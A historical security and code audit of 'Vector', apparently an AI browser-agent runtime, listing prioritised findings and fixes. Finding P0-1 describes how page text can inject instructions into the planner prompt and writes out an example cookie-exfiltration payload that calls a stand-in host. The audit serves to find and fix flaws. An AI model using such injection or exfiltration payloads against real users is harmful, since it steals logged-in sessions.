# Vector — Architecture / Correctness / Security / Test Audit

> **Historical (Sep 2026, pre-M1).** Written against a single early commit. Security items (planner `evaluate`, token modes, sandboxed renderer, body caps) were fixed in PR #1; dev scripts and build debris named below were removed. For current status use [`docs/engine/architecture.md` §0](../engine/architecture.md) and the code.

Scope: read-only review of `/agent/workspace/vector` (~18.3k LOC TS; runtime 7.1k, renderer 2.9k, tests 2.5k, driver 1.9k, contracts 1.6k). No build/test run. Every finding cites `file:line` against the checked-in source. Single commit in history (`917371b`), so no churn analysis was possible.

## Scorecard

| Area | Score | One-line justification |
|---|---|---|
| Runtime durability | 4/10 | Persistence is real (SQLite WAL, event ledger, tabs snapshot) but runs are never resumable, set-run cancel/pause are broken, member agents ignore cancellation, no timeouts around model calls, events table grows unbounded. |
| Contracts | 6/10 | `MethodSchemas` genuinely gates the API/handlers and the renderer's 36 method strings all exist in it; but the MCP server re-declares looser schemas, ~20 result schemas are `z.unknown()`, and `plan.ts` carries a whole parallel Operation/Invocation model the code never uses. |
| Driver abstraction | 6/10 | Clean `DriverPage`/`BrowserDriver` interface; but no reconnection anywhere, `dispose()` leaks Playwright connections opened by `attachDirect`, standalone and attached drivers have silent feature gaps. |
| Security | 4/10 | Token-authed loopback bound to 127.0.0.1 and page views are sandboxed, which is good; but the planner can emit arbitrary `evaluate` JS into logged-in pages from unfenced page text, the token is accepted as a query param and stored world-readable, shell renderer runs `sandbox:false`, no `will-navigate`/permission handlers, no request-size limits. |
| Error handling / observability | 5/10 | `VectorError` codes are consistent inside the runtime; but many failures are swallowed (`catch {}` ×40+), there is no logger at all (3 `console.*` in the whole runtime), no `unhandledRejection` handler, and the WS error frame drops the request `id`. |
| Tests | 5/10 | Executor/interpreter/operations/state have solid unit coverage and integration tests hit a real headless Chrome; but scheduler cancel/pause, API auth, driver reconnect, EventBus, RunService, cookies profile path, Electron IPC handlers and the renderer store are untested, and the integration suite is macOS-only and port-fixed. |
| Docs vs code | 4/10 | Multiple concrete contradictions: `pnpm bench` points at a non-existent file, `sets.create` params documented wrong, MCP tool count wrong (17 vs 29), `programs.run parameters` documented but never applied, ADRs describe states/effect classes the code does not have. |
| Code quality | 6/10 | Readable, consistently structured, few TODOs; but two `extractJson` implementations, dead code blocks, stray dev scripts checked in, 800-line `pages.ts`, and `any`-typed row mappers throughout `repo.ts`. |

---

## P0 findings

### P0-1. Model-planned `evaluate` steps run arbitrary JS in the user's logged-in pages — prompt injection ⇒ data exfiltration
- `packages/contracts/src/program.ts:169-175` — `evaluate` is a first-class `StepSchema` op; `PlanChunkSchema.steps` (`plan.ts:16`) accepts every `StepSchema` op, so the planner may emit it.
- `apps/runtime/src/agent/coordinator.ts:82` explicitly lists `evaluate` in `OBSERVATION_BLIND_OPS`, i.e. it is expected from the model. `executor.ts:87-96` dispatches it to `page.evaluate(s.expression)` with no gate; `allowEval` (executor.ts:29-30) only guards interpreter `{eval:}` expressions, not the `evaluate` op.
- Page content reaches the prompt unfenced: `planner.ts:59-62` dumps `c.text`, element names, table cells and `changesSince` lines verbatim under a bare `=== OBSERVATION ===` header (`planner.ts:266`), with no delimiter escaping and no system-prompt instruction that page text is untrusted data. A page containing `=== COMPLETED STEPS ===` or "REPAIR: ..." can spoof the prompt's own section markers.
- Result: any visited page can steer the planner into `{"op":"evaluate","expression":"fetch('https://evil/?c='+document.cookie)"}` executed in the shared persistent partition (`native-views.ts:19`, `persist:vector-default`) that holds the user's imported Chrome cookies (`cookies.ts`).
- Fix: strip `evaluate` (and `{eval:}`) from the planner-facing schema (`PlanChunkSchema` should use a `StepSchema.exclude(...)` variant); keep it only for trusted program sources (CLI/MCP-authored programs with an explicit `allowEval`-style flag). Fence observation text (e.g. wrap in a unique random delimiter, escape lines starting with `===`), and add a system-prompt rule that page content is data. Also consider blocking `expression` waits (`program.ts:40-44`) from plans.

### P0-2. Set-run cancellation does not stop work, and `finishSetRun` overwrites the cancelled status
- `apps/runtime/src/services/runs.ts:108-133` — `runAgentForMember` passes `signal: new AbortController().signal` (a fresh, never-aborted signal) and `runId: ""`. `runs.cancel` (`runs.ts:273-277`) aborts `setRunControls` and then `coordinator.cancel` marks the run `cancelled`, but every in-flight member agent keeps making model calls and executing steps.
- `set-runner.ts:132-133` — after members drain, `.then(() => this.finishSetRun(run.runId))` (`runs.ts:172,236`) runs unconditionally and rewrites `run.status` to `completed`/`partially_completed`/`failed` (`runs.ts:194`), clobbering `cancelled`.
- `set-runner.ts:124` — on abort the job `return`s from `catch` without touching the member, leaving `status: "running"` members in the DB forever (`SetMemberSchema` has no "cancelled" state, `entities.ts:127`).
- Also: model calls made by member agents are never recorded (`runMemberAgent` `recordModelCall` is not passed, `runs.ts:123-132`) so `config.modelCalls` (`runs.ts:197`) is always 0 and the UI badge claims "0-model" for model-driven set runs; results are saved with `runId: ""` (`member-agent.ts:59`) and are unreachable via `listResults({runId})`.
- Fix: thread `abort.signal` and the real `runId` into `runAgentForMember`; in `finishSetRun` early-return if the run is already terminal; on abort mark members `skipped`; pass `recordModelCall`.

### P0-3. Loopback token is accepted in the URL query string and written world-readable
- `apps/runtime/src/api/server.ts:71` — `url.searchParams.get("token") === this.opts.token` is accepted on every HTTP route, not just `/ws`; tokens in URLs land in shell history, proxy logs and `Referer` headers.
- `apps/runtime/src/main.ts:229` — `writeFileSync(join(config.dataDir, "runtime.json"), JSON.stringify({ port, token, pid }))` uses default mode (0644 on macOS) — any local user/process can read the bearer token and drive the user's browser session (cookies, `evaluate`, `chrome.importCookies`).
- `settings.ts:61-65` stores `gatewayApiKey` in plaintext in the SQLite `kv` table (also default file mode via `config.ts:28`).
- Fix: `writeFileSync(..., { mode: 0o600 })` and `chmod` the data dir; accept the query token only on the WS upgrade path; consider Keychain storage for the gateway key.

## P1 findings

### P1-1. Runs are not resumable; `runtime.describe` advertises `checkpointResume: true`
- `coordinator.ts:716-725` `markInterrupted()` is the only recovery. All run state (`outcomes`, `repairCount`, `activePageId`, `visionUsed`) lives in local variables of `loop()` (`coordinator.ts:265-281`), never persisted. `handlers.ts:360` claims `checkpointResume: true`; the only checkpoint support is interpreter `resumeFrom` (`interpreter.ts:164-171`) which `programs.run` (`runs.ts:279`) and the coordinator never set. Docs say "runs left in active states are marked interrupted" (`docs/architecture.md:97-99`), consistent with code; the product claim of a "durable execution runtime" is overstated.
- Fix: either persist loop state to `runs.config` at each iteration and implement a real `runs.resume` after restart, or drop the `checkpointResume` flag and word the docs as "crash-safe ledger, not resumable".

### P1-2. No timeouts on model calls or driver commands outside Playwright defaults; deadline only checked at loop top
- `gateway-client.ts:52-67,127-148` — `generateObject`/`generateText` get `abortSignal` but no timeout; a hung gateway stalls a run indefinitely (only `runs.cancel` frees it). `coordinator.ts:353` checks `deadline` once per iteration, so `deadlineMs` cannot interrupt a long model call or `pages.execute`.
- `RpcChannel.call` has a 30s timeout (`ipc-channel.ts:48`) but `pages.open` awaits `native.createPage` then `driver.attach` with a 30s scan (`cdp-driver.ts:110`) — up to 60s+ per open with no caller-visible progress.
- Fix: `AbortSignal.any([c.abort.signal, AbortSignal.timeout(MODEL_CALL_MS)])`; make `deadline` an `AbortSignal.timeout` chained into `c.abort`.

### P1-3. Set-run `pause` is a no-op; `concurrency` param is ignored
- `runs.ts:250-258` writes `status: "paused"` but `SetRunner.map` never consults it; all members continue. Comment "current members finish" is false — queued members also start.
- `set-runner.ts:63,88-132` — `opts.concurrency` is accepted by the schema (`api.ts:86`), documented (`docs/api.md:58`), used by tests (`tests/integration/sets.test.ts:55`), and never read; concurrency is solely the global `WorkerPool` built once from settings at construction (`runs.ts:50`), so `settings.set({maxWorkers})` has no effect until restart.
- Fix: honor `concurrency` by wrapping jobs in a per-map semaphore; make pause a gate checked before each `pool.acquire`; rebuild/resize the pool on settings change.

### P1-4. WebSocket RPC error frames drop the request `id`; WS `method` not validated
- `server.ts:53` — `ws.send(JSON.stringify({ error }))` omits `id`, so a WS client cannot correlate failures (docs call WS "the event stream" but the code also serves RPC over it). `server.ts:49-50` passes `msg.method` straight to `invoke` without the `MethodSchemas` check the HTTP path does (`server.ts:83`).
- Fix: include `id`; share one dispatch helper for HTTP and WS.

### P1-5. Electron shell renderer runs with `sandbox: false`; no navigation or permission handlers
- `apps/desktop/main/index.ts:536-541` — shell `WebContentsView` has `contextIsolation: true, nodeIntegration: false` (good) but `sandbox: false`. The preload (`preload/index.cts:7-58`) exposes a generic `invoke(method, params)` passthrough to every one of the 78 runtime methods (including `settings.set` with the gateway key, `chrome.importCookies`, `pages.execute` with `evaluate`) plus `saveFile(name, content)` that writes arbitrary content anywhere the dialog allows, and `openPath`/`openExternal` with no URL-scheme check (`index.ts:402,428`). A renderer XSS therefore has full runtime authority. In dev the shell loads from `http://127.0.0.1:5197` (`index.ts:553-555`).
- Page views (`native-views.ts:54-59`) are correctly `sandbox: true`, `contextIsolation: true`, `nodeIntegration: false`, and `setWindowOpenHandler` denies tab-style popups (`native-views.ts:108-125`). But there is no `will-navigate`/`will-attach-webview` guard, no `session.setPermissionRequestHandler` (camera/mic/geolocation/notifications prompts default-allow in Electron), and popups that pass the `wantsWindow` regex are `allow`ed with a `webPreferences` override but inherit no `preload` isolation checks. `web-contents-created` adoption (`index.ts:477-495`) trusts any popup.
- `openExternal` in main is reachable from the runtime via `native.openExternal` (`index.ts:195-198`) with no scheme allow-list — `file://`/`smb://` etc. pass through.
- Fix: `sandbox: true` on the shell view (preload uses only `contextBridge`/`ipcRenderer`, so it is sandbox-compatible); allow-list `ui.openExternal`/`native.openExternal` to `http(s):`; add `setPermissionRequestHandler` denying by default on `profileSession()`; narrow `invoke` to a method allow-list for the renderer.

### P1-6. Driver connections leak and never reconnect
- `cdp-driver.ts:146-168` and `vector-electron.ts:22-53` — `attachDirect` opens a second `chromium.connectOverCDP` per target and stores only the `PlaywrightDriverPage`; `dispose()` (`playwright-page.ts:790-795`) only removes listeners, never closes that browser connection. Every fallback attach leaks a CDP WebSocket for the runtime's lifetime.
- No driver has reconnection logic: `isConnected()` (`cdp-driver.ts:49`) flips false when Electron/Chrome drops the socket and every subsequent `pages.open` fails with `backend_unavailable` (`pages.ts:173`) until restart. `onTargetsChanged` (`cdp-driver.ts:256-264`) is never assigned by the runtime, so `context.on("page")` (`cdp-driver.ts:38`) is dead.
- `standalone.ts:63` — `createTarget` navigates with `page.goto(url).catch(() => {})`, then `pages.open` (`pages.ts:239`) navigates again; a failing URL is silently swallowed and `pages.open` returns success.
- Fix: track owned `Browser` handles per direct attach and close them in `dispose`; add `browser.on("disconnected")` → mark session degraded + emit `session.changed` + lazy reconnect on next open.

### P1-7. `runs.get` schema/handler drift, `runs.start` `context` is not in the schema
- `handlers.ts:100-107` returns `{run, steps, modelCalls}` but `ResultSchemas["runs.get"]` (`api.ts:340`) has no `modelCalls`. `RunsStartParams` (`api.ts:92-103`) has no `context` field, yet the renderer sends `context` (`renderer/src/store.ts:222`) and `RunService.start`/coordinator read `opts.context` (`runs.ts:146`, `coordinator.ts:127`). Because zod v4 `z.object` strips unknown keys, `context` is silently dropped after `schema.parse` (`handlers.ts:41`) — the chat "EARLIER IN THIS SESSION" feature (`planner.ts:256`) can never fire from the UI.
- Fix: add `context: z.string().max(N).optional()` to `RunsStartParams`; add a unit test asserting each handler result parses against its `ResultSchemas` entry.

### P1-8. `programs.run` accepts `parameters` and never applies them
- `runs.ts:279-301` — `opts.parameters` is unused; there is no `{{param}}` substitution anywhere (`grep "{{"` is empty) despite `SavedProgramSchema.stepsJson` promising "steps with {{param}} placeholders" (`entities.ts:154`) and the CLI/MCP/docs exposing `--param k=v` (`cli/main.ts:741-750`, `docs/cli.md:42`). `runs.ts:283-285` is a dead `if` block with a comment admitting the siteKey check does nothing.
- Fix: implement substitution (or map `parameters` into `program.inputs` for node programs) and delete the dead block.

### P1-9. `Repo` upserts silently drop fields
- `repo.ts:296` — `saveProgram` `ON CONFLICT` updates only name/description/version/use_count/last_used_at; `steps_json`, `site_key`, `parameters` are never updated (a re-save with new steps is ignored).
- `repo.ts:85-92` — `saveTabs` does DELETE + N INSERTs without a transaction; a crash between them loses the whole restore list (`pages.ts:340` swallows the error).
- `repo.ts:531-533` — `markDatasetsStale(pageId, documentEpoch)` ignores `documentEpoch`.
- `repo.ts:117-124` — migrations `catch {}` every error, so a real schema failure (disk full, corrupt db) is indistinguishable from "column exists".
- Fix: wrap multi-statement writes in `db.exec("BEGIN")/COMMIT`; complete the `ON CONFLICT` set lists; match `duplicate column` errors only.

### P1-10. Unbounded growth and no `unhandledRejection` handler
- `events` table (`db.ts:62-64`) has no pruning path; `EventBus.emit` writes synchronously on every UI event (`page.updated` fires per navigation/title/favicon/loading). `spans`, `model_calls`, `history`, `response_metadata` plus body artifacts (`responses.ts:40-48`, up to 256 KB each for every JSON/text/HTML response on every page, `playwright-page.ts:32-33`) also grow forever.
- No `process.on("unhandledRejection")` anywhere in `apps/runtime` or `apps/desktop/main` (grep empty). Node 22 crashes the runtime on an unhandled rejection; e.g. `pages.ts:241 void this.refreshMeta(lp)` is safe, but `main.ts:300`, `pages.ts:397`, `index.ts:89-92` chains and `set-runner.ts:132` `Promise.all` are candidates.
- Fix: retention job (e.g. keep 30 days / N MB of events, artifacts); install `unhandledRejection` → log + mark run failed.

### P1-11. Chrome cookie import leaves decrypted-adjacent copies in `/tmp` and injects into a shared partition
- `cookies.ts:183-190` — `mkdtempSync(join(tmpdir(), "vector-cookies-"))` copies every profile's `Cookies` DB and never deletes the directory. The copies still contain `encrypted_value`, but also the plaintext `value` column for rows Chrome stored unencrypted, and they persist across reboots on macOS' per-user tmp.
- Imported cookies land in the single `persist:vector-default` partition (`native-views.ts:19`) shared by human tabs and agent worker pages (`set-runner.ts:146-151` opens workers in the same backend/partition), so P0-1 applies to imported sessions too.
- Fix: `rmSync(tmp, {recursive:true})` in a `finally`; consider a separate partition for runtime-owned workers.

## P2 findings

- **Duplicate `extractJson`** with divergent semantics: `planner.ts:220-245` (returns `undefined`, objects only) vs `gateway-client.ts:8-27` (throws, handles arrays). Only the latter is tested (`tests/unit/gateway-client.test.ts`).
- **Gateway fallback amplifies cost on non-schema errors**: `gateway-client.ts:75-115` retries with text generation on *any* error (401, 429, network), up to 3 calls per logical call, contradicting "one explicit retry owner" (`gateway-client.ts:30`) and the `audit.md:76` "retry amplification: none" claim. Guard on `NoObjectGeneratedError`/`TypeValidationError` only.
- **`allowEval` default is permissive**: `executor.ts:248` `ctx.allowEval ?? true`. `PageService.execute` overrides to `false` (`pages.ts:574`) but the spread `...ctx` after it (`pages.ts:575`) means a caller passing `allowEval: undefined` explicitly re-enables `new Function` (`interpreter.ts:77`) in the runtime process. Default should be `false`.
- **`forEach` `concurrency` runs browser steps concurrently on one page** (`interpreter.ts:274-288`) — `runner.runOne` shares a single `DriverPage`; parallel `click`/`fill` on one tab interleave nondeterministically. Only makes sense for non-browser nodes; either reject concurrency when the body contains `step` nodes or document it.
- **`WorkerPool.waitForSlot` leaks abort listeners**: `pool.ts:56-59` adds an `abort` listener per wait and never removes it on resolve; a long-lived run signal accumulates closures per member.
- **Server has no body size limit** (`server.ts:75-79`) and `/health` leaks service identity unauthenticated (fine) — add a 1–10 MB cap.
- **`state.ts:75`** `since: q.scope?.runId ? undefined : undefined` — nonsense expression; `StateQuery.scope.setId`, `freshness`, `completeness`, `select` on non-`responses` entities are accepted and ignored. Cursor miss (`state.ts:47`) silently restarts from 0.
- **`artifacts.ts:54`** throws a bare `Error` (surfaces as `internal`), inconsistent with `VectorError("not_found")` used elsewhere.
- **`translateSteps` builds `role=button[name=...]` without escaping** (`main.ts:149`); a name containing `]` produces an unparseable target (`ref-registry.ts:49`).
- **Settings**: `settings.set({gatewayApiKey: ""})` stores `""` which `??` treats as set (`settings.ts:81`) — clearing the key in the UI (`Settings.tsx:103`) also disables the `.env` key; `undefined` values cannot unset (`settings.ts:63`). `all()` returns `dataDir` derived by string-replacing `/settings.json` (`settings.ts:57`) instead of `config.dataDir`.
- **Search-engine default disagreement**: runtime default is Google (`settings.ts:94`), renderer default is DuckDuckGo (`chrome.ts:19`, `Settings.tsx:191`), and the runtime format has no `%s` while the renderer template expects `%s` — `toUrl` with the runtime default would append nothing.
- **`markDatasetsStale` on every `onNavigated`** including same-document `did-navigate-in-page` (`native-views.ts:74-77` → `pages.ts:693`) — hash changes invalidate datasets.
- **`pages.open` swallows navigation failure** (`pages.ts:239` `.catch(() => {})`) — a bad URL returns a healthy `PageTarget`.
- **`RpcChannel.onFrame` is `async` but the transport ignores its promise** (`ipc-channel.ts:36`); handler exceptions before `try` (none today) would be unhandled.
- **Dev scripts checked in**: `packages/browser-driver/drive.mjs`, `drive2.mjs` (hard-coded CDP port 63011, screenshot to /tmp) and `scripts/fixtures.d.mts`.
- **Giant files**: `pages.ts` 804 lines mixes registry, native-event ingestion, observation diffing, execution, find/zoom/capture; `coordinator.ts:247-658` is a 400-line method with 15 mutable locals.
- **`any` row mappers** across `repo.ts` (every `as any[]`) — no runtime validation that DB rows match the contracts; a schema drift (e.g. `controllerEpoch` added via `??=` at `repo.ts:62`) is patched ad hoc.
- **Unused/dead**: `InvokeFn`'s `client: {external}` arg (`server.ts:7`) is never consumed by `makeInvoker` (`handlers.ts:37`), so there is no renderer-vs-external distinction; `SetRunnerDeps.nativeAvailable` unused; `bridge.ts` `NativeMethods` lists `native.print` but not `acquireStage`/`releaseStage`/`stopPage`/`setCookies` which the runtime actually calls (`native.ts:49-75`); `RuntimeNotifications` lacks `view.navState`, `app.closing`, `app.quitting`, `view.targetReplaced` is never emitted.
- **Ad-hoc event type strings** (`bookmarks.changed`, `operation.invoked`, `operation.saved`, `page.emitted`, `page.invalidated`, `session.changed`) bypass `EventTypes` (`events.ts:16-37`).
- **`plan.ts:57-156`** defines `OperationImplKindSchema`, `SessionRequestImplSchema`, `OperationSchema` (effectClass `read|mutation|download|mixed`, states `candidate|validated|degraded|retired`, effectOutcome `confirmed-applied|...`) that nothing imports; the live code uses different vocabularies (`read|write|destructive`, `candidate|validated|shadow|quarantined`, `observed|verified|unverified|not-dispatched`, `operations.ts:106,221,437,493`). Two sources of truth for the same concept.
- **TODO/FIXME/HACK markers**: none. Five `eslint-disable` lines (3 React hooks deps, 2 `no-explicit-any`) — no eslint config exists in the repo, so they are inert.

---

## Contracts: single source of truth?

- **Yes for API params**: `server.ts:83` and `handlers.ts:38-41` both gate on `MethodSchemas`; all 36 method strings used by the renderer exist in the 78-entry `MethodSchemas`. CLI is a pass-through (`cli/main.ts`) with no local schemas.
- **No for MCP**: `packages/mcp/src/main.ts` re-declares every tool's input schema by hand with looser types (`steps: z.array(z.record(z.string(), z.unknown()))` at `main.ts:66,120`; `program: z.record(...)` at `main.ts:390,422`), and its `vector_page_execute` description says `{op:'click', target:{ref:'r3'}}` (`main.ts:63,66`) while `StepSchema.target` is a string — an MCP client following the tool docs produces schema-invalid steps. It also sends a `verify` param (`main.ts:72`) that no schema has.
- **Result schemas**: 20 of 78 `ResultSchemas` are `z.unknown()`/`z.array(z.unknown())` (`api.ts:396-417`) and nothing validates results anyway.
- **Loose on boundaries that matter**: `operations.saveRequest` accepts arbitrary `url`/`headers`/`body` (`api.ts:266-279`) and the runtime will `fetch()` it server-side (`operations.ts:573`) — an SSRF primitive for anyone holding the token; `guards: z.record(z.string(), z.unknown())` is interpreted as a `Predicate` at `operations.ts:436` without validation; `evaluate.expression` and `Condition.expression` are unconstrained strings.

## Driver abstraction parity gaps

| Capability | VectorElectron | Standalone | AttachedChrome |
|---|---|---|---|
| `createTarget` | via `Target.createTarget` (unused; native path preferred) | yes | yes (creates tabs in user's Chrome) |
| `activateTarget` | yes | **no** — `pages.openLive` throws `capability_unsupported` only for chrome; vector path calls `pages.activate` which needs native (`pages.ts:407`) | yes |
| `getAllCookies`/`setCookies` | yes | **no** — `CookieService.inject` fails `backend_unavailable` (`cookies.ts:128`) | yes |
| downloads | native `will-download` path | Playwright `download` event, `path` always `undefined` (`playwright-page.ts:91`) | none: borrowed tabs download in Chrome; `expectDownload` times out |
| reconnect | none | none | none |
| `refEntry` shared `RefRegistry` | per driver instance (`cdp-driver.ts:21`) — a page moved between drivers loses refs | | |

`DriverPage.observe` for cross-origin frames is skipped (`playwright-page.ts:588`) — fine, but the `frames` list exposes their URLs to the prompt. `resolveLocator` (`playwright-page.ts:253-303`) tries `role` before `css` even when the ref was registered from CSS, and `getByRole(..., exact:false)` can re-target a *different* element with a superset name after a DOM change — the "stale refs fail loudly" promise (`docs/architecture.md:64-65`) holds only for navigation, not for same-document mutation.

## Security summary (loopback + Electron + credentials)

- Loopback: bound to `127.0.0.1` (`server.ts:37`), bearer or query token (`server.ts:71`), no CORS headers emitted (so a web page cannot *read* responses), but a page can still *send* a no-cors `POST` — harmless without the token. No `Host`/`Origin` check (DNS-rebinding safe only because of the token). WS auth via query token only (`server.ts:26`).
- A page loaded in a tab cannot reach the runtime without the token; the token is however readable by any local process (P0-3) and any renderer XSS via `window.vector.invoke` (P1-5).
- `.env`: not loaded anywhere in code (no `dotenv`); `AI_GATEWAY_API_KEY` is read from `process.env` (`settings.ts:81`) — `.env.example`/README imply copying `.env` works, but only if the shell exports it. Electron forks the runtime with `...process.env` (`runtime-proc.ts:37`), so the key propagates from the launching shell.
- MCP/CLI read `runtime.json` (`mcp/client.ts:474-479`, `cli/client.ts:841-849`) and send the token as a bearer header — correct; `vector doctor` masks it (`cli/main.ts:591`).
- Remote-debugging port is opened on the Electron app itself (`index.ts:26`, `remote-debugging-port=0`) with **no auth**: any local process can read `DevToolsActivePort` and drive every Vector tab over CDP, bypassing the runtime token entirely. This is inherent to the design but undocumented.

## Untested critical paths

1. `RunService` set-run lifecycle: cancel/pause/resume, status overwrite race, `runId: ""` results — nothing in `tests/`.
2. `RunCoordinator` pause/resume/answer/needs_input, deadline, `maxModelCalls`, retargeting on `target_detached`, recovery-model path (only vision + no-progress are covered in `vision-fallback.test.ts`).
3. `ApiServer`: no test hits HTTP or WS — auth rejection, query-token, unknown method, malformed JSON, error `id` correlation. Integration tests call `rt.invoke` in-process (`runtime-api.test.ts:20`), bypassing the server entirely. E2E (`desktop.test.ts`) uses the token but only the happy path.
4. `EventBus`/`events.since` under concurrent writers; WS broadcast.
5. Driver reconnection/disconnect handling, `attachDirect` fallback, `dispose` leak.
6. `PageService`: enqueue/lane reentrancy (`pages.ts:153-161`), `withKeys` conflict mutex (`pages.ts:123-143`), `restoreTabs`, `onNativeRemoved` storms, stage lease acquire/release.
7. Store recovery beyond one happy path: `saveTabs` atomicity, migration failure, `observations` pruning, `markRunningInvocationsInterrupted`.
8. Cookie *profile* path (`cookies.ts:155-250`) — only the attached path and pure helpers are tested.
9. Electron main IPC handlers (`index.ts:98-437`), `TargetRegistry`, popup adoption, download wiring — zero unit tests; e2e only exercises open/observe/find/zoom.
10. Renderer `store.ts` (454 lines of state transitions from events) — only `chrome.ts` helpers and a CSS-token regex test exist.
11. MCP server tool handlers — untested.
12. `ResponseStore`/passive capture, `Tracer`, `bench`.

**Determinism**: unit tests are deterministic. Integration tests depend on fixed ports 4810-4812 (`scripts/fixtures.mjs:178-182`), `/Applications/Google Chrome.app` (`attached-chrome.test.ts:17`; `StandaloneDriver` also needs a system Chrome), reuse already-listening fixtures (state bleeds between runs via `/api/state` edits — `runtime-api.test.ts:84-104` asserts `before.edits.length < after.edits.length`, which is order-dependent with the sets test running against the same server), poll with wall-clock timeouts (60-120 s), and `vision-fallback.test.ts:89-97` busy-polls the DB. `recovery.test.ts:36` comment says "graceful stop BEFORE the fake run exists — no shutdown marking", then inserts a `running` row by hand — the test verifies `markInterrupted`, not real crash recovery. `tests/unit/operations.test.ts:229` saves a run with a non-existent `kind: "agent"` field (cast `as never`).

## Docs vs code contradictions

| Doc | Says | Code |
|---|---|---|
| `package.json:20`, `README.md:16`, `docs/local-testing.md:50-53`, `docs/runtime-vnext/*` | `pnpm bench` → `node tests/benchmarks/run.mjs`; reports in `benchmarks/manifests`, `benchmarks/reports` | `tests/benchmarks/` and `benchmarks/` do not exist (`benchmarks/` is `.gitignore`d). `progress.md:74-77` cites measured numbers from files not in the repo. |
| `docs/api.md:57` | `sets.create { name, members: [{url}] }` | `SetsCreateParams` has `urls`, `pageIds`, `records`, `collectFromPageId` (`api.ts:63-72`); no `members`. |
| `docs/api.md:98` | `bench.run { url, repeats }` | schema is `{ task?, repeats? }` (`api.ts:227`). |
| `docs/api.md:94` | `workspace.get → { pages, sessions, runs, settings, … }` | no `settings` in the result (`handlers.ts:200-209`). |
| `docs/api.md:114-115` | "Optional steps record `skipped` instead of failing" | optional failures record `failed` and continue (`executor.ts:157-163`); `skipped` is only used after abort (`executor.ts:262`). |
| `docs/api.md:117-118` | op list includes `drag` | op is `dragTo` (`program.ts:100-105`). |
| `docs/api.md:122-123` | `expectDownload { saveAs? }` | `saveAs` is in the schema (`program.ts:142`) but never read by the executor (`executor.ts:170-208`). |
| `docs/api.md:48-50`, `docs/cli.md:42`, MCP `vector_program_run` | `programs.run { parameters }` | parameters ignored (P1-8). |
| `docs/mcp.md:22` | "Tools (17)" and a 17-row table | 29 `registerTool` calls (`mcp/main.ts`). |
| `docs/mcp.md`, `mcp/main.ts:63,66` | `target:{ref:'r3'}` step shape | `target` is a string (`program.ts:49-51`). |
| `docs/architecture.md:109-110`, `troubleshooting.md:44-46` | takeover → "the run pauses"; "`runs.resume` returns control to the agent" | takeover throws `conflict` from `checkValid` (`pages.ts:581-584`) which fails the chunk; the coordinator treats it like any failure (repair ladder), never sets `paused`. `runs.resume` does nothing for a run that is not `paused` (`coordinator.ts:161-172`). |
| `docs/troubleshooting.md:37` | "`stale_ref` errors" | code is `target_detached` (`playwright-page.ts:260-263`); no `stale_ref` code exists (`errors.ts`). |
| `docs/runtime-vnext/decisions.md:31-34` (ADR-8) | states `candidate/validated/degraded/promoted`, promotion on ≥1 input | code: `candidate/validated/shadow/quarantined`, promotion on ≥3 distinct inputs (`operations.ts:451`); `progress.md:33` agrees with code, ADR does not. |
| `decisions.md:9` (ADR-2) | impl kinds `browser-program | session-request | observed-data` | `runtime.describe` reports only two (`handlers.ts:338`); `plan.ts:57-63` lists five. |
| `decisions.md:13` (ADR-3) | "Rejected: Node-side fetch replay" | Node-side `fetch` fallback exists (`operations.ts:573-586`) and is reachable whenever host differs or page lookup throws. |
| `decisions.md:29` (ADR-7) | "resume re-observes rather than re-executing" | no resume path exists for runs (P1-1). |
| `docs/runtime-vnext/audit.md:76` | "Retry amplification — SDK maxRetries: 0; app owns one retry owner" | gateway fallback issues up to 3 calls per structured call (P2). |
| `audit.md:78` | "response-capture listeners must detach on target destroy" | `dispose()` calls `removeAllListeners()` (`playwright-page.ts:794`) but `attachDirect` browsers are never closed (P1-6). |
| `README.md:22-24` / `.env.example` | copy `.env.example` to `.env` to enable goals | nothing loads `.env`; only exported env vars work. |
| `docs/architecture.md:26-28` | renderer subscribes via WS `/ws` | renderer receives events over Electron IPC (`main.ts:234` → `index.ts:518` → preload `onEvent`), not WS. |
| `handlers.ts:360` `runtime.describe` | `checkpointResume: true`, `takeover: true` | see P1-1 and takeover row above. |
| `docs/local-testing.md:24` | `pnpm test:unit` covers "contracts, refs, rpc, executor, repo, pool, chrome shell" | also covers cookies, gateway-client, interpreter, ipc-channel, operations, state, vision-fallback (undersold, not wrong). |

## Highest-leverage fixes (ordered)

1. Remove `evaluate`/`expression`/`eval` from anything the model can author; fence observation text. (P0-1)
2. Fix set-run cancellation/pause/status-overwrite and thread `runId`/signal/`recordModelCall` into member agents. (P0-2, P1-3)
3. `runtime.json` mode 0600; query-token only on `/ws`; shell `sandbox: true`; permission handler; scheme allow-list on `openExternal`. (P0-3, P1-5)
4. Timeouts around model calls and a real deadline signal. (P1-2)
5. Add `context` to `RunsStartParams`, `modelCalls` to `runs.get` result schema, a result-schema conformance test, and generate MCP tool schemas from `MethodSchemas`. (P1-7, contracts)
6. Close `attachDirect` browsers in `dispose`; implement disconnect → degraded → reconnect. (P1-6)
7. Transactions in `Repo`, complete `ON CONFLICT` sets, event/artifact retention, `unhandledRejection` handler. (P1-9, P1-10)
8. Either implement run resume or stop advertising it; fix the docs table above.
